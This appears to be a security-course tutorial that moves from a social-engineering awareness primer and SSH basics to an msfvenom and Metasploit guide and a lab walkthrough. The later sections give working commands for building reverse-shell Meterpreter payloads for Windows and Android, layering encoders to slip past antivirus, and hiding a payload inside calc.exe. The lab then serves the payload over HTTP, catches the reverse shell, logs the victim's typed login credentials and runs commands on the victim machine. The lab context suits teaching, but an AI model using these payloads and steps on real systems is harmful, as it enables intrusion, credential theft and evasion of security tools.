
Social engineering is the art of manipulating people so they give up confidential information. The types of information these criminals are seeking can vary. 

But when individuals are targeted, the criminals are usually trying to trick you into giving them your passwords or bank information, or access your computer to secretly install malicious software – that will give them access to your passwords and bank information as well as giving them control over your computer.

Criminals use social engineering tactics because it is usually easier to exploit your natural inclination to trust than it is to discover ways to hack your software. For example, it is much easier to fool someone into giving you their password than it is for you to try hacking their password (unless the password is really weak).

In addition, hackers try to exploit a user's lack of knowledge. Thanks to the speed of technology, many consumers and employees aren’t aware of certain threats like **drive-by downloads**. Users also may not realize the full value of personal data, like their phone number. As a result, many users are unsure how to best protect themselves and their information.

**Drive by download attacks specifically refer to malicious programs that install to your devices without your consent. This also includes unintentional downloads of any files or bundled software onto a computer device.**


## Traits of a Social Engineering Attack

Regardless of the attacker’s goals, there are some clear signs that communication is from social engineering. One primary component in social engineering is playing on a targeted user’s fears and emotions. The attacker doesn’t want the targeted user digesting and contemplating the request, so social engineering involves using fear and a sense of urgency.

A few common traits in all social engineering attacks are:

- **Heightened emotions:** An attacker threatens the loss of an account to trick users into providing their credentials, or the attacker might pretend to be an executive demanding money from a targeted user to instill a sense of urgency in an employee fearful of losing their job.
  
- **Spoofed sender address:** Most users are unaware that a sender email address can be spoofed, but proper email security will stop spoofed senders from accessing a targeted user’s inbox. Instead, an attacker will register a domain similar to an official one and hope that a targeted user does not notice the misspelling.
  
- **Strange friend requests:** It’s not uncommon for an attacker to compromise an email account and spam malicious messages to the victim’s contact list. Messages are usually short and don’t have the personalized element from friends, so be hesitant to click links from friends if the message does not sound like personalized communication.
  
- **Unprofessional website links:** Phishing links are sometimes used with social engineering to trick users into divulging sensitive information. Never enter credentials into a website directly from an email link, even if it looks like an official site (e.g., PayPal).
  
- **Too good to be true:** Scammers often promise money in exchange for monetary compensation. For example, a targeted user could get a free iPhone in exchange for shipping payments. If the offer is too good to be true, then it is probably a scam.
  
- **Suspicious attachments:** Instead of tricking targeted users into divulging private information, a sophisticated attack might work towards installing malware on a corporate machine using email attachments. Never run macros or executables on a machine from a seemingly harmless email message.
  
- **Questionable sender:** Many social engineering techniques are designed to mimic a familiar source, such as a friend, boss, or co-worker. In the event you receive a suspicious email message, always check in and ask yourself “did my boss/friend/co-worker actually send this to me?” Before responding to the email in question, contact the actual person via phone call, text, or social media message to validate whether or not their being impersonated.
  
- **Refusal to respond to questions:** If a message seems suspicious, reply to the message and ask the sender to identify themselves. An attacker will avoid identifying themselves and might just ignore the request.
  
- **Unidentifiable sender:** If the sender is unable or unwilling to verify their identity with the organization, do not provide any additional information or access that they're requesting. While email messages are the most common, this applies to other social engineering tactics as well, such as text messages, phone calls, etc.


### Examples of Social Engineering Techniques

The overall technique used in social engineering is using emotions to trick users, but attackers use several standard methods to push the user into performing an action (e.g., sending money to a bank account) and making the attack look more legitimate. Usually, the techniques involve email or text messages, because they can be used without voice conversations.

A few common examples of social engineering techniques include:

- **Phishing:** With social engineering, an attacker usually pretends to be a corporate executive to trick users into sending money to an offshore bank account.
  
- **Vishing and smishing:** Attackers use text messages and voice-changing software to send SMS messages or robo-call users. The messages usually promise gifts or services in exchange for payment. These types of scams are called vishing (voice phishing) and smishing (SMS phishing).
  
- **CEO (executive) fraud:** Users often feel urgency when an executive requests action, so an attacker will pretend to be the CEO or another executive to instill a sense of urgency for the targeted employee to perform an action. This is known as **CEO fraud**.
  
- **Baiting:** It’s common for attackers to promise prizes or money in exchange for a small payment. The offer is usually too good to be true, and the payment is usually for shipping or some other cost coverage.
  
- **Pretexting:** Attackers may create a false pretext to gain sensitive information or access to a system. For example, an attacker might impersonate a bank teller and contact a target individual to claim that there’s been suspicious activity on their account and ask them to share sensitive information to confirm their account.
  
- **Tailgating or piggybacking:** Corporations that use security scanners to block unauthorized access to the premises. An attacker uses tailgating or piggybacking to trick users into using their own access cards to give the attacker physical access to the premises.
  
- **Quid pro quo:** Disgruntled employees could be tricked into providing sensitive information to an attacker in exchange for money or other promises.
  
- **Watering hole:** This form of social engineering attack involves targeting certain groups by infecting websites that the group is likely to visit. For example, an attacker might infect a popular news site with malware with the intention that employees of a certain company will visit the site and inadvertently download the malware.
  
- **Responding to a question never asked:** The targeted victim will receive an email “responding” to a question, but the response will ask for personal details, contain a link to a malicious website, or include a malware attachment.
  
- **Threaten loss of money or accounts, or threaten prosecution:** Fear is a useful tool in social engineering, so an effective way to trick users is to tell them that they will suffer money loss or go to jail if they do not comply with the attacker’s request.

To identify a social engineering attack, it’s important to know what it looks like. Social engineering attacks play on a targeted victim’s emotions, but they have a few elements in common regardless of the threat actor’s goals, such as tricking users into sending money.


### Ways to Protect Yourself:

- **Delete any request for financial information or passwords.** If you get asked to reply to a message with personal information, it’s a scam.

- **Reject requests for help or offers of help.** Legitimate companies and organizations do not contact you to provide help. If you did not specifically request assistance from the sender, consider any offer to ’help’ restore credit scores, refinance a home, answer your question, etc., a scam. Similarly, if you receive a request for help from a charity or organization that you do not have a relationship with, delete it. To give, seek out reputable charitable organizations on your own to avoid falling for a scam.

- **Set your spam filters to high**. Every email program has spam filters. To find yours, look at your settings options, and set these to high – just remember to check your spam folder periodically to see if legitimate email has been accidentally trapped there. You can also search for a step-by-step guide to setting your spam filters by searching on the name of your email provider plus the phrase ’spam filters’.

- **Secure your computing devices**. Install anti-virus software, firewalls, email filters and keep these up-to-date. Set your operating system to automatically update, and if your smartphone doesn’t automatically update, manually update it whenever you receive a notice to do so.  Use an anti-phishing tool offered by your web browser or third party to alert you to risks.

---

## Using SSH to Connect to a Remote Server (Windows, Linux & Mac)

**Secure Shell (SSH)** is one of the most effective ways to access and manage remote systems. This technology encrypts communications between the client and the server, enhancing system security and preventing unauthorized access.

##### **Windows**

If you have Windows 10 or later, you won't need to do much, as these operating systems already have SSH built in.

Follow these steps to enable and use SSH in Windows 10:

- To enable SSH, go to **Settings > Apps > Optional Features** and install OpenSSH Client. If it's not available on your computer, go to **Add a feature > OpenSSH Client** and click "Install."
- To use SSH, open PowerShell or Command Prompt and connect to a remote server using this command: 

```bash
ssh username@server_ip
```

#### **Linux**

Most Linux distributions usually have SSH pre-installed. To check whether SSH is available on your system, open the command-line interface, also known as the terminal, and type:

```
ssh
```

If you don't have SSH installed, you can install it with:

```
sudo apt-get install openssh-client
```

After installation, you can connect to a remote server with the following command:

```
ssh username@server_ip
```


#### **Mac**

MacOS has SSH pre-installed. To access it, open the terminal and type the following:

```
ssh
```

You can start an SSH connection by typing:

```
ssh username@server_ip
```


**Authentication Methods**

You can authenticate an SSH session in two main ways:

- Password authentication
- SSH key authentication

---

## Msfvenom

Msfvenom is a command line instance of Metasploit that is used to generate payloads and can also encode them.

**The Metasploit framework** is a powerful tool which can be used to probe systematic vulnerabilities on networks and servers. It provides information about security vulnerabilities and aids in penetration testing and IDS signature development.

**Malware**, short for "malicious software," is any software intentionally designed to cause disruption to a computer, server, client, or computer network.

A **payload** is the part of a malware or exploit that performs the intended malicious action, such as opening a shell or stealing data.

**Meterpreter** is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code. 

Msfvenom is the combination of payload generation and encoding. It replaced `msfpayload` and `msfencode` on June 8th 2015.


**MSFpayload:**

- This was a command-line tool within the Metasploit Framework used to generate payloads, which are pieces of code designed to be executed on a target system.  

- These payloads could perform various actions, such as opening a shell, establishing a connection, or executing commands.

- Essentially, it was the tool for creating the raw code that would be delivered to a target.

**MSFencode:**

- This tool was used to encode payloads generated by MSFpayload.   

- Encoding is crucial because it helps to evade detection by antivirus software and intrusion detection systems.   

- It transforms the payload's code into a different format, making it harder to recognize as malicious.

MSFvenom replaced the separate MSFpayload and MSFencode tools by combining their functionalities into a single, streamlined command-line utility, enhancing efficiency and simplifying the process of generating and encoding payloads within the Metasploit Framework.

## How to generate a payload

To generate a payload, there are two flags that you must supply (-p and -f):

- **The -p flag: Specifies what payload to generate**

To see what payloads are available from Framework, you can do:

```plaintext
msfvenom -l payloads
```

The -p flag also supports “-“ as a way to accept a custom payload:

```plaintext
cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
```

- **The -f flag: Specifies the format of the payload**

Syntax example:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp -f exe
```

To see what formats are supported, you can do the following to find out:

```plaintext
msfvenom --help-formats
```

Typically, this is probably how you will use msfvenom:

```plaintext
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
```

## How to encode a payload

Encoders are used to encode the payload and convert it into pure alphanumeric characters and remove any bad characters to make it suited for the target environment.

By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
```

To find out what encoders you can use, you can use the -l flag:

```plaintext
msfvenom -l encoders
```

You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn’t really meant to be used a real AV evasion solution:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
```

## How to avoid bad characters

The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```

## How to supply a custom template

By default, msfvenom uses templates from the msf/data/templates directory. If you’d like to choose your own, you can use the -x flag like the following:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
```

Please note: If you’d like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:

```plaintext
msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
```

The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.

## How to chain msfvenom output

The old `msfpayload` and `msfencode` utilities were often chained together in order layer on multiple encodings. This is possible using `msfvenom` as well:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
```

```
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
```

```
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```


---

### Creating Metasploit payloads with Msfvenom

Meterpreter is deployed using in-memory DLL injection. As a result, Meterpreter resides entirely in memory and writes nothing to disk. 

No new processes are created as Meterpreter injects itself into the compromised process, from which it can migrate to other running processes. As a result, the forensic footprint of an attack is very limited.

**A DLL is a library that contains code and data that can be used by more than one program at the same time.**

A reverse shell attack exploits vulnerabilities in a target system, allowing the attacker to gain remote access and control over the victim’s computer. It involves establishing a shell session by opening communication channels between the attacker’s machine and the target system.


**Basic Syntax:**

```
msfvenom -p <payload> <options> -f <format> -o <output_file>
```

**Where:**

`-p <payload>` : Specifies the payload to generate.

`<options>`  : These vary depending on the payload.

- `LHOST`: The attacker's IP address.
- `LPORT`: The attacker's listening port.

`-f <format>` : Specifies the output format, such as `exe`, `apk`, `python`, or `raw`.

`-o <output_file>` : Specifies the output file name and path.


**Common Examples:**

- **Generating a Windows reverse TCP payload:**

```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o payload.exe
```

- **Generating an Android reverse TCP payload:**

```c
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f apk -o payload.apk
```


---
## Creating a Reverse Shell On Windows (Practical Session)



### Setting Up the Attack Machine:

1. Open the Kali Linux attack virtual machine and note its IP address (e.g., 10.60.0.7).
   
2. In the terminal, execute the `msfvenom` script to create a standalone payload as an executable file. Verify that the payload setup is successful.

3. Create a web file server on port 80 with the payload.exe directory by running the command:

```c
python -m http.server 80
```

### Configuring the Metasploit Framework:


1. Open a new terminal and start the Metasploit Framework console by typing `msfconsole`.
   
2. Once the console is ready, use the command `use multi/handler` to handle exploits launched outside the framework.

3. Configure the `exploit(multi/handler)` module with the same settings as the generated executable file by setting the payload, local host (LHOST), and local port (LPORT).


- Type `set payload windows/meterpreter/reverse_tcp` to set the payload.

- Type `set LHOST <attacker's IP> ` to set the local host to the Kali attack machine’s IP address.

- Type set `LPORT 4444` to set the local port as the same port made in the executable file.


4. Confirm that everything is set up correctly by entering the command `exploit` to start the server on the meterpreter, waiting for the payload connection.

![][https://miro.medium.com/v2/resize:fit:720/format:webp/1*c4OhK1vHz3gDr9elelrFYA.png]


### Preparing the Victim Machine:

1. Disable Real-time protection on the Windows victim machine.

2. Open a browser application on the victim machine.

3. In the browser tab, type the IP address of the Kali machine

4. Access the HTTP web server directory using the browser and locate the payload.exe file.

![][https://miro.medium.com/v2/resize:fit:2000/format:webp/1*GYQiLfvnBLQYHSsAXGO-iA.png]


5. Click on payload.exe and proceed through any download caution notifications, keeping the file and allowing it to run.

![][https://miro.medium.com/v2/resize:fit:640/format:webp/1*-02hDePRP2jBRRG5BuicUg.png]



### Establishing a Meterpreter Session:

Once the payload is executed, a request is made to the Kali machine, which will acknowledge and create a Meterpreter session.

This Meterpreter session will have complete control over the Windows victim machine.

1. After executing the payload, the Kali machine receives a request and creates a Meterpreter session with the Windows victim machine.
2. Take note of the Meterpreter session number, which displays the IP address of the Windows victim machine.

![][https://miro.medium.com/v2/resize:fit:720/format:webp/1*-CKN9WtT1Ur8JrxjryZgvw.png]


3. Explore the available commands by typing “help” in the Meterpreter session.

![][https://miro.medium.com/v2/resize:fit:720/format:webp/1*PH-DRm7_vvc2DbFUCm1eEg.png]


4. Start the keystroke sniffer by using the command `keyscan_start`.

5. Perform keystrokes on the Windows machine, such as typing in Browser or entering login credentials.

- Open a Browser on the Windows victim machine and type anything: `facebook.com`

- Open a login page (Social Media) and type a fake username and password.

![][https://miro.medium.com/v2/resize:fit:640/format:webp/1*7a015L6uGoNFkbAUxI26DA.png]


6. Use the command `keyscan_dump` to reveal the logged keystrokes.

![][https://miro.medium.com/v2/resize:fit:1100/format:webp/1*YAR5RwApGFnYSgDkpvmYaw.png]


7. Stop the keystroke sniffer by entering `keyscan_stop`.

## Performing Reverse Shell Attack:

1. Execute a reverse shell attack by typing “shell” in the Meterpreter session.
   
2. A Channel 1 shell will be created within the Windows machine, giving control to the attacker.


![][https://miro.medium.com/v2/resize:fit:1100/format:webp/1*xuhDVbhWV6RMG9HB3IPKpQ.png]


3. Open Microsoft Edge by entering the command `start msedge.exe`.

![][https://miro.medium.com/v2/resize:fit:1100/format:webp/1*z9lUa4T_XsqiMaNEhsm8qQ.png]


4. Utilize the shell to perform various actions, such as opening file explorer or running executable files.

5. Exit from the shell by typing `exit`.

6. Use the command `keyboard_send google.com` to automatically type in “google.com” in your browser.

![][https://miro.medium.com/v2/resize:fit:640/format:webp/1*gopGXOKzBdzB3LEyOyzMZg.png]


 7. Use the command `keyboard_send` to send keyboard input.

8. Re-enter the shell by typing `shell` and press Enter.

9. Close Microsoft Edge by executing the command `TASKKILL /F /IM msedge.exe`.


### Conclusion

We just performed a reverse shell attack using Metasploit Framework to gain access to the Windows 10 target machine from the Kali Linux attacker.

With Windows Real-time protection turned off, the attacking machine could gain access to the target machine.

Preventative measures you can take to help prevent an attacker from infiltrating your system include but are not limited to not turning off your Windows Defender or virus protection, keeping up to date with patch management, conducting vulnerability scans that could reveal open ports in network infrastructure, and firewall configurations.

You can upload your unencrypted payload to the following site to see the various different Antivirus’ which flag your file as a virus:

![][https://www.101labs.net/wp-content/uploads/2022/04/74-8.png]

![][https://www.101labs.net/wp-content/uploads/2022/04/74-9.png]


### Assignment : Perform a Reverse Shell on a Linux System


##  Next Practical Sessions In Practicals

1. Veil Tool
2. TheFatRat Tool
3. Embedding Malware in PDF
4. Embedding Malware in WORD
5. Embedding Malware in Browser Extension
6. Empire  Tool
7. Social Engineering Toolkit
8. Sending Fake Emails - Phishing
9. Vishing - Voice Phishing

---


